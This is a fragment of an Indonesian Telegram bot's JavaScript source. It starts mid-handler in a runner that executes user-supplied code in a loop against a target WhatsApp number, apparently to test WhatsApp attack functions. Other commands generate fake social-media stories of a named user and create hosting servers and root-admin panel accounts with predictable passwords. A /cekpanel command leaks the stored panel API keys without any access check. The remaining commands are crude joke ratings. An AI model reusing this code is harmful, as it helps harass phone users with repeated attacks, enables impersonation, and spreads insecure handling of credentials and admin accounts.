    const testFunction = vm.runInContext(wrappedCode, context);

    if (typeof testFunction !== "function")
      return bot.sendMessage(chatId, "❌ Function tidak valid atau gagal diload.");

    const progressMsg = await bot.sendMessage(
      chatId,
      `🔄 Menjalankan test function ke *${targetNumber}*\n🔁 Loop: ${loopCount}x\nStatus: Starting...`,
      { parse_mode: "Markdown" }
    );

    let successCount = 0;
    let errorCount = 0;
    const errors = [];

    for (let i = 0; i < loopCount; i++) {
      try {
        await testFunction(sock, ensureJid(target));
        successCount++;
        const progress = Math.round(((i + 1) / loopCount) * 100);
        if (i % Math.ceil(loopCount / 10 || 1) === 0) {
          await bot.editMessageText(
            `🔄 Progress: ${i + 1}/${loopCount}\n✅ Success: ${successCount}\n❌ Error: ${errorCount}\n📈 ${progress}%`,
            { chat_id: chatId, message_id: progressMsg.message_id }
          );
        }
        await sleep(800);
      } catch (err) {
        errorCount++;
        errors.push(`Loop ${i + 1}: ${err.message}`);
      }
    }

    let result = `📊 HASIL TEST FUNCTION`;
    result += `\`\`\`👋🏻 HAI KAK ${username}\n`;
    result += `❀ Target: ${targetNumber}\n`;
    result += `❀ Total Loop: ${loopCount}\n`;
    result += `❀ Sukses: ${successCount}\n❀ Error: ${errorCount}\n`;
    result += `❀ Rate: ${((successCount / loopCount) * 100).toFixed(2)}%\`\`\`\n\n`;

    if (errors.length > 0) {
      result += `❀ Error detail (max 5):\n${errors.slice(0, 5).join("\n")}`;
    }

    await bot.editMessageText(result, {
      chat_id: chatId,
      message_id: progressMsg.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "🔍 Cek Target", url: `https://wa.me/${targetNumber}` }]],
      },
    });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan:\n${err.message}`);
  }
});

//---------------------------- ( Case Md ) ------------------------------------\\

const API_BASE = "https://api.zenzxz.my.id/api/maker/fakestory";
const API_KEY = ""; // opsional: isi kalau API butuh apikey, contoh: "https://api.zenzxz.my.id/api/maker/fakestory"

// === HANDLER: Command /fakestory ===
bot.onText(/^\/fakestory (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].split("|").map((a) => a.trim());
  if (args.length < 3) {
    bot.sendMessage(chatId, "⚠️ Format salah!\nGunakan: /fakestory username | caption | link_foto");
    return;
  }
    
 if (blacklistedCommands.includes('/fakestory')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }

  const [username, caption, ppurl] = args;
  await buatFakeStory(chatId, username, caption, ppurl, bot);
});

// === HANDLER: Reply ke foto dengan "username | caption" ===
bot.on("message", async (msg) => {
  if (!msg.reply_to_message || !msg.text) return;
  const text = msg.text.trim();
  if (!text.includes("|")) return;

  const [username, caption] = text.split("|").map((t) => t.trim());
  if (!username || !caption) return;

  // Pastikan pesan yang direply ada foto
  const photos = msg.reply_to_message.photo;
  if (!photos) return;

  // Ambil resolusi terbesar dari foto
  const fileId = photos[photos.length - 1].file_id;
  const fileLink = await bot.getFileLink(fileId);

  await buatFakeStory(msg.chat.id, username, caption, fileLink, bot);
});

// === FUNGSI UTAMA PEMBUAT STORY ===
async function buatFakeStory(chatId, username, caption, ppurl, bot) {
  const statusMsg = await bot.sendMessage(chatId, "⏳ Membuat fake story... tunggu sebentar ya!");

  try {
    let url = `${API_BASE}?username=${encodeURIComponent(username)}&caption=${encodeURIComponent(caption)}&ppurl=${encodeURIComponent(ppurl)}`;
    if (API_KEY) url += `&apikey=${API_KEY}`;

    const res = await fetch(url);
    if (!res.ok) {
      await bot.editMessageText(`❌ Gagal membuat story (status ${res.status})`, {
        chat_id: chatId,
        message_id: statusMsg.message_id,
      });
      return;
    }

    const buffer = Buffer.from(await res.arrayBuffer());

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ Fake story untuk *${username}* berhasil dibuat!`,
      parse_mode: "Markdown",
    });

    await bot.deleteMessage(chatId, statusMsg.message_id);
  } catch (err) {
    console.error("Error:", err);
    await bot.editMessageText(`❌ Terjadi kesalahan: ${err.message}`, {
      chat_id: chatId,
      message_id: statusMsg.message_id,
    });
  }
}

// === COMMAND /ustadz ===
bot.onText(/\/ustadz(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  if (!query) {
    return bot.sendMessage(
      chatId,
      "🕌 Contoh penggunaan:\n`/ustadz Hai semua`",
      { parse_mode: "Markdown" }
    );
  }

 if (blacklistedCommands.includes('/ustadz')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
    
  await bot.sendMessage(chatId, "⏳ Sedang membuat gambar Ustadz...");

  try {
    // 🔥 API tanpa apikey, hanya pakai text
    const apiUrl = `https://api.zenzxz.my.id/api/maker/ustadz2?text=${encodeURIComponent(query)}`;

    // ambil gambar dari API
    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data, "binary");

    // kirim ke telegram sebagai foto
    await bot.sendPhoto(chatId, buffer, {
      caption: `🕌 Soalan: ${query}`,
    });
  } catch (err) {
    console.error("Error:", err.message);
    bot.sendMessage(chatId, `⚠️ Terjadi kesalahan: ${err.message}`);
  }
});

//▰▰▰ FILE PERSIAPAN ▰▰▰//
const RAM_OPTIONS = {
    "1gb": { ram: 1024, disk: 10240, cpu: 50 },
    "2gb": { ram: 2048, disk: 20480, cpu: 60 },
    "3gb": { ram: 3072, disk: 30720, cpu: 70 },
    "4gb": { ram: 4096, disk: 40960, cpu: 80 },
    "5gb": { ram: 5120, disk: 51200, cpu: 90 },
    "6gb": { ram: 6144, disk: 61440, cpu: 100 },
    "7gb": { ram: 7168, disk: 71680, cpu: 110 },
    "8gb": { ram: 8192, disk: 81920, cpu: 120 },
    "9gb": { ram: 9216, disk: 92160, cpu: 130 },
    "10gb": { ram: 10240, disk: 102400, cpu: 140 },
    "unli": { ram: 0, disk: 0, cpu: 0 },
};
const cpanelFile = './cpanel.json';
const aksesFile = './aksescpanel.json';

try {
    if (!fs.existsSync(cpanelFile)) fs.writeFileSync(cpanelFile, '[]', 'utf-8');
    if (!fs.existsSync(aksesFile)) fs.writeFileSync(aksesFile, JSON.stringify({ akses: [], owner: [] }, null, 2));
} catch (error) {
    console.error('Error saat inisialisasi file:', error);
}

function readCpanel() {
    try {
        const data = fs.readFileSync(cpanelFile, 'utf-8');
        return JSON.parse(data);
    } catch (error) {
        console.error(`Error membaca ${cpanelFile}:`, error);
        return []; 
    }
}

function saveCpanel(data) {
    try {
        fs.writeFileSync(cpanelFile, JSON.stringify(data, null, 2));
    } catch (error) {
        console.error(`Error menyimpan ${cpanelFile}:`, error);
    }
}

function readAkses() {
    try {
        const data = fs.readFileSync(aksesFile, 'utf-8');
        return JSON.parse(data);
    } catch (error) {
        console.error(`Error membaca ${aksesFile}:`, error);
        return { akses: [], owner: [] }; 
    }
}

function saveAkses(data) {
    try {
        fs.writeFileSync(aksesFile, JSON.stringify(data, null, 2));
    } catch (error) {
        console.error(`Error menyimpan ${aksesFile}:`, error);
    }
}

function isAkses(id) {
    const a = readAkses();
    return a.akses.includes(id) || isOwner(id) || a.owner.includes(id); 
}

function isOwnerPanel(id) {
    const a = readAkses();
    return a.owner.includes(id) || isOwner(id); 
}
const datapanelnya = readCpanel()
const apiKey = datapanelnya[0]?.plta;
const clientKey = datapanelnya[0]?.pltc;
const panelUrl = datapanelnya[0]?.domain;
const defaultEggId = datapanelnya[0]?.eggid;
const defaultLocationId = datapanelnya[0]?.location;
const nestId = datapanelnya[0]?.nestid
async function createPterodactylServer({ name, password, ram, disk, cpuPercent, eggId, locationId, admin }) {
const headers = {
  'Authorization': `Bearer ${apiKey}`,
  'Content-Type': 'application/json',
  'Accept': 'application/json',
};
  const safeUsername = name.toLowerCase().replace(/[^a-z0-9_.-]/g, '');
  const email = `${safeUsername}@gmail.com`;

  const user = await createUser({
    username: safeUsername,
    email,
    firstName: name,
    lastName: 'User',
    password,
    admin
  });
  if (!user) return null;

  const eggDetails = await getEggDetails(nestId, eggId);
  if (!eggDetails) {
      console.error(`❌ Gagal mendapatkan detail untuk Egg ID: ${eggId}`);
      return null;
  }
  
  const allocation = await findAvailableAllocation(locationId);
  if (!allocation) {
    console.error(`❌ Tidak ada alokasi (port) yang tersedia di Lokasi ID: ${locationId}.`);
    return null;
  }

  try {
    const serverPayload = {
      name: `${name}'s Server`,
      user: user.id,
      egg: eggId,
      docker_image: eggDetails.docker_image,
      startup: eggDetails.startup,
      environment: eggDetails.environment,
      limits: {
        memory: ram,
        swap: 0,
        disk: disk,
        io: 500,
        cpu: cpuPercent,
      },
      feature_limits: {
        databases: 1,
        allocations: 1,
        backups: 1,
      },
      allocation: {
        default: allocation.id,
      },
    };

    const { data: serverData } = await axios.post(`${panelUrl}/api/application/servers`, serverPayload, { headers });
    
    console.log('✅ Server berhasil dibuat:', serverData.attributes.identifier);
    
    return {
        username: safeUsername,
        password: password,
        serverIdentifier: serverData.attributes.identifier,
        panelUrl: panelUrl,
    };

  } catch (err) {
    console.error('❌ Gagal membuat server:', err.response?.data?.errors || err.message);
    return null;
  }
}

async function createUser({ username, email, firstName, lastName, password, admin}) {
  try {
const headers = {
  'Authorization': `Bearer ${apiKey}`,
  'Content-Type': 'application/json',
  'Accept': 'application/json',
};
    const { data } = await axios.post(`${panelUrl}/api/application/users`, {
      username: username,
      email: email,
      first_name: firstName,
      last_name: lastName,
      password: password,
      root_admin: admin,
    }, { headers });
    console.log(`✅ User berhasil dibuat: ${username} (ID: ${data.attributes.id})`);
    return data.attributes;
  } catch (err) {
    if (err.response?.data?.errors?.[0]?.code === 'UnprocessableEntityHttpException') {
        console.warn(`⚠️ User '${username}' atau email '${email}' sudah ada. Mencoba mencari user...`);
        return findUserByUsername(username);
    }
    console.error('❌ Gagal membuat user:', err.response?.data?.errors || err.message);
    return null;
  }
}
async function findAvailableAllocation(locationId) {
    try {
        const headers = {
            'Authorization': `Bearer ${apiKey}`,
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        };

        const { data: nodes } = await axios.get(
            `${panelUrl}/api/application/nodes?per_page=200`, 
            { headers }
        );

        for (const node of nodes.data) {
            
            if (Number(node.attributes.location_id) === Number(locationId)) {
               

                const nodeId = node.attributes.id;
                const { data: allocations } = await axios.get(
                    `${panelUrl}/api/application/nodes/${nodeId}/allocations?per_page=200`, 
                    { headers }
                );

                const availableAllocation = allocations.data.find(alloc => !alloc.attributes.assigned);

                if (availableAllocation) {
                    console.log(`✅ Alokasi tersedia ditemukan di Node ID ${nodeId}:`, availableAllocation.attributes.id);
                    return availableAllocation.attributes;
                }
            }
        }

        console.error(`❌ Tidak ada alokasi (port) tersedia yang ditemukan di Lokasi ID: ${locationId}`);
        return null;

    } catch (err) {
        console.error('❌ Gagal saat proses mencari alokasi:', err.response?.data?.errors || err.message);
        return null;
    }
}
async function findUserByUsername(username) {
    try {
    const headers = {
  'Authorization': `Bearer ${apiKey}`,
  'Content-Type': 'application/json',
  'Accept': 'application/json',
};
        const { data } = await axios.get(`${panelUrl}/api/application/users?filter[username]=${username}`, { headers });
        if (data.data.length > 0) {
            console.log(`✅ User '${username}' ditemukan.`);
            return data.data[0].attributes;
        }
        console.error(`❌ User '${username}' tidak ditemukan setelah gagal membuat.`);
        return null;
    } catch (err) {
        console.error(`❌ Gagal mencari user '${username}':`, err.message);
        return null;
    }
}



async function getEggDetails(nestId, eggId) {
    try {
const headers = {
  'Authorization': `Bearer ${apiKey}`,
  'Content-Type': 'application/json',
  'Accept': 'application/json',
};
        const { data } = await axios.get(`${panelUrl}/api/application/nests/${nestId}/eggs/${eggId}?include=variables`, { headers });
        const attr = data.attributes;
        const environment = attr.relationships.variables.data.reduce((env, variable) => {
            env[variable.attributes.env_variable] = variable.attributes.default_value;
            return env;
        }, {});

        return {
            docker_image: attr.docker_image,
            startup: attr.startup,
            environment: environment,
        };
    } catch (err) {
        console.error('❌ Gagal mendapatkan detail Egg:', err.response?.data?.errors || err.message);
        return null;
    }
}
bot.onText(/\/cpanel(?: (.+))?$/, async (msg, match) => {
    const adminChatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isAkses(userId)) {
        return bot.sendMessage(adminChatId, "kamu tidak memiliki akses");
    }

    try {
        const argsText = match[1];
        const args = argsText ? argsText.split(' ') : []; 

        let targetChatId = adminChatId; 
        let actualArgs = args;          

        if (args.length > 0 && /^\d{5,}$/.test(args[0])) {
            targetChatId = args[0];     
            actualArgs = args.slice(1); 
        }

        if (actualArgs.length < 3) {
            const formatMessage = `❌ <b>Perintah Salah!</b>\n\n<b>Format:</b>\n/cpanel [target_id] &lt;ukuran&gt; &lt;nama&gt; &lt;password&gt;\n\n<b>Contoh:</b>\n/cpanel 1gb alxzy pass123\n/cpanel 12345678 1gb alxzy pass123\n\n<b>Ukuran:</b>\n${Object.keys(RAM_OPTIONS).join(', ')}`;
            
            return bot.sendMessage(adminChatId, formatMessage, { parse_mode: 'HTML' });
        }

        const size = actualArgs[0];
        const name = actualArgs[1];
        const password = actualArgs.slice(2).join(' '); 

        const selectedOption = RAM_OPTIONS[size.toLowerCase()];

        if (!selectedOption) {
            const invalidSizeMessage = `❌ <b>Ukuran tidak valid!</b>\n\nPilih: ${Object.keys(RAM_OPTIONS).join(', ')}`;
            return bot.sendMessage(adminChatId, invalidSizeMessage, { parse_mode: 'HTML' });
        }

        await bot.sendMessage(adminChatId, "⏳ Sedang memproses permintaan Anda, harap tunggu...");

        const serverDetails = await createPterodactylServer({
            name: name,
            password: password,
            ram: selectedOption.ram,
            disk: selectedOption.disk,
            cpuPercent: selectedOption.cpu,
            eggId: defaultEggId,
            locationId: defaultLocationId,
            admin: selectedOption?.admin ? true : false
        });

        if (serverDetails) {
            const successMessage = `
✅ <b>Server Berhasil Dibuat!</b>

<b>Panel URL:</b> ${panelUrl}
<b>Username:</b> <code>${serverDetails.username}</code>
<b>Password:</b> <code>${serverDetails.password}</code>
<b>Server ID:</b> <code>${serverDetails.serverIdentifier}</code>

Silakan login untuk mengelola server Anda.`;
            
            await bot.sendMessage(targetChatId, successMessage, { parse_mode: 'HTML' });
            
            if (targetChatId !== adminChatId) {
                await bot.sendMessage(adminChatId, `✅ Berhasil membuat dan mengirim detail panel ke ID: ${targetChatId}`);
            }
            
        } else {
            await bot.sendMessage(adminChatId, "❌ Gagal membuat server. Periksa konsol untuk detail atau hubungi administrator.");
        }

    } catch (error) {
        console.error('Error di command cpanel:', error);
        await bot.sendMessage(adminChatId, '❌ Terjadi kesalahan internal saat memproses permintaan Anda.');
    }
});
//▰▰▰ PANEL CONFIG ▰▰▰//
bot.onText(/\/addpanel (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const t = match[1].split(',');

  if (!isOwner(senderId)) return bot.sendMessage(chatId, '❌ Hanya owner utama yang bisa menambah panel.');
  if (t.length < 6) return bot.sendMessage(chatId, '⚠️ Format salah!\nGunakan: /addpanel domain,plta,pltc,eggid,locationid,nestid');

  const [domain, plta, pltc, eggid, location, nestid] = t.map(a => a.trim());
  const panels = readCpanel();

  if (panels.some(p => p.domain === domain)) return bot.sendMessage(chatId, '⚠️ Domain sudah terdaftar!');
  panels.push({ domain, plta, pltc, eggid, location, nestid });
  saveCpanel(panels);

  bot.sendMessage(chatId, `✅ Panel ditambahkan!\n🌐 Domain: ${domain}\n🔑 PLTA: ${plta}\n🔑 PLTC: ${pltc}`);
});

bot.onText(/\/hapuspanel (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const domain = match[1].trim();

  if (!isOwner(senderId)) return bot.sendMessage(chatId, '❌ Hanya owner utama yang bisa hapus panel!');
  const panels = readCpanel();
  const newPanels = panels.filter(p => p.domain !== domain);

  if (newPanels.length === panels.length) return bot.sendMessage(chatId, '⚠️ Domain tidak ditemukan.');
  saveCpanel(newPanels);

  bot.sendMessage(chatId, `🗑️ Panel ${domain} berhasil dihapus.`);
});

bot.onText(/\/cekpanel/, (msg) => {
  const chatId = msg.chat.id;
  const panels = readCpanel();

  if (panels.length === 0) return bot.sendMessage(chatId, '📭 Belum ada panel tersimpan.');
  const text = panels.map((p, i) =>
    `${i + 1}. 🌐 *${p.domain}*\nPLTA: \`${p.plta}\`\nPLTC: \`${p.pltc}\``).join('\n\n');
  bot.sendMessage(chatId, `📋 *Daftar Panel:*\n\n${text}`, { parse_mode: 'Markdown' });
});


//▰▰▰ ADMIN PANEL ▰▰▰//
bot.onText(/\/adminpanel (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = match[1].trim();

  if (!isOwnerPanel(senderId)) return bot.sendMessage(chatId, '❌ Kamu tidak punya izin membuat admin panel!');
  const panels = readCpanel();
  if (panels.length === 0) return bot.sendMessage(chatId, '⚠️ Belum ada panel tersimpan.');

  const panel = panels[0];
  const email = `${username}@admin.otax`;
  const password = `${username}999`;

  try {
    const resUser = await fetch(`${panel.domain}/api/application/users`, {
      method: "POST",
      headers: { "Content-Type": "application/json", Authorization: `Bearer ${panel.plta}` },
      body: JSON.stringify({
        email,
        username,
        first_name: username,
        last_name: "Admin",
        language: "en",
        password,
        root_admin: true
      }),
    });
    const dataUser = await resUser.json();
    if (!dataUser.attributes) throw new Error('Gagal membuat admin panel');

    bot.sendMessage(chatId, `👑 *Admin Panel Dibuat!*\n🌐 ${panel.domain}\n👤 ${username}\n🔑 ${password}`, { parse_mode: 'Markdown' });
  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal membuat admin panel: ${err.message}`);
  }
});

//▰▰▰ SISTEM IZIN AKSES ▰▰▰//
bot.onText(/\/addakses (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const id = parseInt(match[1]);
  if (!isOwner(senderId)) return bot.sendMessage(chatId, '❌ Hanya owner utama yang bisa menambah akses.');
  const data = readAkses();
  if (data.akses.includes(id)) return bot.sendMessage(chatId, '⚠️ User sudah punya akses.');
  data.akses.push(id); saveAkses(data);
  bot.sendMessage(chatId, `✅ Akses diberikan ke ID: ${id}\nBisa membuat panel sampai 10GB.`);
});

bot.onText(/\/delakses (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const id = parseInt(match[1]);
  if (!isOwner(senderId)) return bot.sendMessage(chatId, '❌ Hanya owner utama yang bisa hapus akses.');
  const data = readAkses();
  data.akses = data.akses.filter(x => x !== id);
  saveAkses(data);
  bot.sendMessage(chatId, `🗑️ Akses user ${id} dihapus.`);
});

bot.onText(/\/aksesowner (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const id = parseInt(match[1]);
  if (!isOwner(senderId)) return bot.sendMessage(chatId, '❌ Hanya owner utama yang bisa menambah owner panel.');
  const data = readAkses();
  if (data.owner.includes(id)) return bot.sendMessage(chatId, '⚠️ User sudah owner panel.');
  data.owner.push(id); saveAkses(data);
  bot.sendMessage(chatId, `👑 ID ${id} sekarang *Owner Panel* (bisa buat admin panel).`, { parse_mode: 'Markdown' });
});

bot.onText(/\/delaksesowner (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const id = parseInt(match[1]);
  if (!isOwner(senderId)) return bot.sendMessage(chatId, '❌ Hanya owner utama yang bisa hapus owner panel.');
  const data = readAkses();
  data.owner = data.owner.filter(x => x !== id);
  saveAkses(data);
  bot.sendMessage(chatId, `🗑️ Owner panel ID ${id} dihapus.`);
});

bot.onText(/\/cekakses/, (msg) => {
  const chatId = msg.chat.id;
  const data = readAkses();
  const aksesList = data.akses.map(id => `• ${id}`).join('\n') || '-';
  const ownerList = data.owner.map(id => `• ${id}`).join('\n') || '-';
  bot.sendMessage(chatId, `📋 *Daftar Akses Panel*\n\n👤 *Akses (1–10GB)*:\n${aksesList}\n\n👑 *Owner Panel (admin access)*:\n${ownerList}`, { parse_mode: 'Markdown' });
});

bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const randomImage = getRandomImage();
  const chatType = msg.chat.type;
  const isPremium = await premium (senderId);
            
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/brat')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

            //cek prem//
if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}

  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});




const LANGUAGES = {
  en: "🇬🇧 English",
  id: "🇮🇩 Indonesia",
  ar: "🇸🇦 Arabic",
  es: "🇪🇸 Spanish",
  fr: "🇫🇷 French",
  de: "🇩🇪 German",
  ja: "🇯🇵 Japanese",
  ru: "🇷🇺 Russian",
  zh: "🇨🇳 Chinese"
};


// Fungsi komentar berdasarkan nilai
function komentarTampan(nilai) {
  if (nilai >= 100) return "💎 Ganteng dewa, mustahil diciptakan ulang.";
  if (nilai >= 94) return "🔥 Ganteng gila! Mirip artis Korea!";
  if (nilai >= 90) return "😎 Bintang iklan skincare!";
  if (nilai >= 83) return "✨ Wajahmu memantulkan sinar kebahagiaan.";
  if (nilai >= 78) return "🧼 Bersih dan rapih, cocok jadi influencer!";
  if (nilai >= 73) return "🆒 Ganteng natural, no filter!";
  if (nilai >= 68) return "😉 Banyak yang naksir nih kayaknya.";
  if (nilai >= 54) return "🙂 Lumayan sih... asal jangan senyum terus.";
  if (nilai >= 50) return "😐 Gantengnya malu-malu.";
  if (nilai >= 45) return "😬 Masih bisa lah asal percaya diri.";
  if (nilai >= 35) return "🤔 Hmm... mungkin bukan harinya.";
  if (nilai >= 30) return "🫥 Sedikit upgrade skincare boleh tuh.";
  if (nilai >= 20) return "🫣 Coba pose dari sudut lain?";
  if (nilai >= 10) return "😭 Yang penting akhlaknya ya...";
  return "😵 Gagal di wajah, semoga menang di hati.";
}

function komentarCantik(nilai) {
  if (nilai >= 100) return "👑 Cantiknya level dewi Olympus!";
  if (nilai >= 94) return "🌟 Glowing parah! Bikin semua iri!";
  if (nilai >= 90) return "💃 Jalan aja kayak jalan di runway!";
  if (nilai >= 83) return "✨ Inner & outer beauty combo!";
  if (nilai >= 78) return "💅 Cantik ala aesthetic tiktok!";
  if (nilai >= 73) return "😊 Manis dan mempesona!";
  if (nilai >= 68) return "😍 Bisa jadi idol nih!";
  if (nilai >= 54) return "😌 Cantik-cantik adem.";
  if (nilai >= 50) return "😐 Masih oke, tapi bisa lebih wow.";
  if (nilai >= 45) return "😬 Coba lighting lebih terang deh.";
  if (nilai >= 35) return "🤔 Unik sih... kayak seni modern.";
  if (nilai >= 30) return "🫥 Banyak yang lebih butuh makeup.";
  if (nilai >= 20) return "🫣 Mungkin inner beauty aja ya.";
  if (nilai >= 10) return "😭 Cinta itu buta kok.";
  return "😵 Semoga kamu lucu pas bayi.";
}

// /cektampan
bot.onText(/^\/cektampan$/, (msg) => {
  const nilai = [10, 20, 30, 35, 45, 50, 54, 68, 73, 78, 83, 90, 94, 100][Math.floor(Math.random() * 14)];
  const teks = `
📊 *Hasil Tes Ketampanan*
👤 Nama: *${msg.from.first_name}*
💯 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarTampan(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// /cekcantik
bot.onText(/^\/cekcantik$/, (msg) => {
  const nilai = [10, 20, 30, 35, 45, 50, 54, 68, 73, 78, 83, 90, 94, 100][Math.floor(Math.random() * 14)];
  const teks = `
📊 *Hasil Tes Kecantikan*
👤 Nama: *${msg.from.first_name}*
💯 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarCantik(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// Nilai dan komentar untuk kekayaan
function komentarKaya(nilai) {
  if (nilai >= 100) return "💎 Sultan auto endorse siapa aja.";
  if (nilai >= 90) return "🛥️ Jet pribadi parkir di halaman rumah.";
  if (nilai >= 80) return "🏰 Rumahnya bisa buat konser.";
  if (nilai >= 70) return "💼 Bos besar! Duit ngalir terus.";
  if (nilai >= 60) return "🤑 Kaya banget, no debat.";
  if (nilai >= 50) return "💸 Kaya, tapi masih waras.";
  if (nilai >= 40) return "💳 Lumayan lah, saldo aman.";
  if (nilai >= 30) return "🏦 Kayanya sih... dari tampang.";
  if (nilai >= 20) return "🤔 Cukup buat traktir kopi.";
  if (nilai >= 10) return "🫠 Kaya hati, bukan dompet.";
  return "🙃 Duitnya imajinasi aja kayaknya.";
}

// Nilai dan komentar untuk kemiskinan
function komentarMiskin(nilai) {
  if (nilai >= 100) return "💀 Miskin absolut, utang warisan.";
  if (nilai >= 90) return "🥹 Mau beli gorengan mikir 3x.";
  if (nilai >= 80) return "😩 Isi dompet: angin & harapan.";
  if (nilai >= 70) return "😭 Bayar parkir aja utang.";
  if (nilai >= 60) return "🫥 Pernah beli pulsa receh?";
  if (nilai >= 50) return "😬 Makan indomie aja dibagi dua.";
  if (nilai >= 40) return "😅 Listrik token 5 ribu doang.";
  if (nilai >= 30) return "😔 Sering nanya *gratis ga nih?*";
  if (nilai >= 20) return "🫣 Semoga dapet bansos.";
  if (nilai >= 10) return "🥲 Yang penting hidup.";
  return "😵 Gaji = 0, tagihan = tak terbatas.";
}

// /cekkaya
bot.onText(/^\/cekkaya$/, (msg) => {
  const nilai = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100][Math.floor(Math.random() * 10)];
  const teks = `
💵 *Tes Kekayaan*
👤 Nama: *${msg.from.first_name}*
💰 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarKaya(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// /cekmiskin
bot.onText(/^\/cekmiskin$/, (msg) => {
  const nilai = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100][Math.floor(Math.random() * 10)];
  const teks = `
📉 *Tes Kemiskinan*
👤 Nama: *${msg.from.first_name}*
📉 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarMiskin(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// Fungsi komentar berdasarkan skor
function komentarJanda(nilai) {
  if (nilai >= 100) return "🔥 Janda premium, banyak yang ngantri.";
  if (nilai >= 90) return "💋 Bekas tapi masih segel.";
  if (nilai >= 80) return "🛵 Banyak yang ngajak balikan.";
  if (nilai >= 70) return "🌶️ Janda beranak dua, laku keras.";
  if (nilai >= 60) return "🧕 Pernah disakiti, sekarang bersinar.";
  if (nilai >= 50) return "🪞 Masih suka upload status galau.";
  if (nilai >= 40) return "🧍‍♀️ Janda low-profile.";
  if (nilai >= 30) return "💔 Ditinggal pas lagi sayang-sayangnya.";
  if (nilai >= 20) return "🫥 Baru ditinggal, masih labil.";
  if (nilai >= 10) return "🥲 Janda lokal, perlu support moral.";
  return "🚫 Masih istri orang, bro.";
}

// /cekjanda
bot.onText(/^\/cekjanda$/, (msg) => {
  const nilai = Math.floor(Math.random() * 101); // 0 - 100
  const teks = `
👠 *Tes Kejandaan*
👤 Nama: *${msg.from.first_name}*
📊 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarJanda(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

// Fungsi komentar sesuai skor pacar
function komentarPacar(nilai) {
  if (nilai >= 95) return "💍 Sudah tunangan, tinggal nikah.";
  if (nilai >= 85) return "❤️ Pacaran sehat, udah 3 tahun lebih.";
  if (nilai >= 70) return "😍 Lagi anget-angetnya.";
  if (nilai >= 60) return "😘 Sering video call tiap malam.";
  if (nilai >= 50) return "🫶 Saling sayang, tapi LDR.";
  if (nilai >= 40) return "😶 Dibilang pacaran, belum tentu. Tapi dibilang nggak, juga iya.";
